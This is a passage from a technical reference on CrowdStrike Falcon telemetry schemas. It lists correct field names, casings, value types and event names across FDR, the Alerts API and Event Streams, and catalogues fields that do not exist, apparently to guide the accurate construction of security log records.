- Timeline: use `ContextTimeStamp` / `ProcessStartTime` (sensor time). `timestamp` is cloud arrival time and can
  lag by seconds.
- Alert grouping: `aggregate_id` (aggind:...) ties together alerts in one process tree; in the console this is the
  "Detection"/"Incident" process-tree view (Endpoint security → Endpoint detections, activity-v2 links).
- Console vocabulary: "Endpoint detections" (alerts), "Investigate → Event search" (FDR-equivalent telemetry,
  `#event_simpleName` in LogScale/NG-SIEM), "Process explorer / Process tree", "Network containment"
  (host isolation), "RTR" (Real Time Response), "IOA" (behavioural) vs "IOC" (hash/domain) detections,
  "OverWatch" (managed hunting; `product:"overwatch"`, `type:"lead"`).
- Hash pivot: FDR `SHA256HashData` = alert `sha256` = Event Streams `SHA256String` (three spellings of one value).

---

## 6. Common mistakes / fields that do NOT exist

- **Mixing casings**: FDR is PascalCase (`CommandLine`, `ImageFileName`, `SHA256HashData`); Alerts API is
  snake_case (`cmdline`, `filepath`, `sha256`); Event Streams is PascalCase but with different names
  (`SHA256String`, `FilePath`, `Hostname`). Do not put `cmdline` on an FDR event or `SHA256HashData` on an alert.
- FDR values are **strings** (`"RemotePort":"443"`, `"timestamp":"1790669662417"`). Alerts API values are typed
  (`"severity":70`, `"show_in_ui":true`).
- `UserName`, `ParentImageFileName`, `ParentCommandLine`, `GrandParentBaseFileName` are **not** fields of a raw
  Windows FDR `ProcessRollup2` (only `ParentBaseFileName` + `ParentProcessId`; the parent's command line is on the
  parent's own PR2 — Splunk security_content PR #4294 hit exactly this). The Parent*/Grandparent* full-path and
  command-line fields DO exist on detection-info events (`ScriptControlScanTelemetry`, `FalconProcessHandleOpDetectInfo`,
  `HttpRequestDetect`) and on Event Streams/alerts — not on telemetry PR2. User name comes from `UserLogon` /
  `UserIdentity` (4.7) or, on file events, the event's own `UserName`.
- `ComputerName` — **changed (2025+)**: older raw FDR process/network events had none (host name only via aidmaster);
  current-sensor raw lines carry `ComputerName` and `LocalAddressIP4` (section 1). Do not put `ComputerName` on an
  event that is meant to look like a pre-2025 sensor, and never add `OU`, `SiteName`, `MachineDomain`, `Version`,
  `AgentVersion` to a telemetry event — those exist only in `aidmaster`.
- `aidmaster` / `userinfo` records are not events: no `event_simpleName`, no `id`, no epoch-ms `timestamp`
  (`aidmaster` uses `Time`, `userinfo` uses `_time`, both `"<sec>.<ms>"` strings).
- `#event_simpleName`, `@timestamp`, `#repo` are LogScale/NG-SIEM search fields — never put them into an FDR object.
- `event_simpleName` values that do NOT exist: `ProcessCreate`, `ProcessCreation`, `NetworkConnection`,
  `DnsQuery`, `FileCreate`, `FileWrite`. Use `ProcessRollup2`, `NetworkConnectIP4`, `DnsRequest`, `PeFileWritten` /
  `NewExecutableWritten` / `NewScriptWritten` / `GenericFileWritten`.
- No `ProcessId` / `PID` field on FDR PR2 — it's `RawProcessId` (OS) and `TargetProcessId` (Falcon).
- `DestinationIp`, `RemoteIP`, `SourceIp`, `dst_ip` do not exist in FDR — use `RemoteAddressIP4` / `LocalAddressIP4`.
- Legacy vs current detection objects:
  - Detects API (decommissioned 2025-09-30) used `detection_id` (`ldt:<aid>:<n>`), `max_severity`,
    `max_severity_displayname`, `behaviors[]` array, `first_behavior`, `device.hostname`. The Alerts API flattens
    one behaviour per alert and uses `composite_id`, `severity`, `severity_name`. Don't emit `behaviors[]` or
    `max_severity_displayname` in a current alert.
  - Event Streams `DetectionSummaryEvent` (legacy) → `EppDetectionSummaryEvent` (current): `DetectName`→`Name`,
    `DetectDescription`→`Description`, `ComputerName`→`Hostname`, `SensorId`→`AgentId`, `DetectId`→`CompositeId`;
    legacy `Severity` was 1–5, current `Severity` is 0–100 with `SeverityName`.
- Invented fields seen in training material that do NOT exist: `crowdstrike.alert_title`, `cs.detection_name`,
  `event.ProcessName`, `ThreatName`, `DetectionURL`, `MitreTechnique` (use `technique_id`), `Action:"blocked"`
  (use `pattern_disposition*`).
- No SIEM wrappers: no `crowdstrike.fdr.*`, no `data.*`, no `@timestamp`, no `event.kind` — those are Elastic/Wazuh.
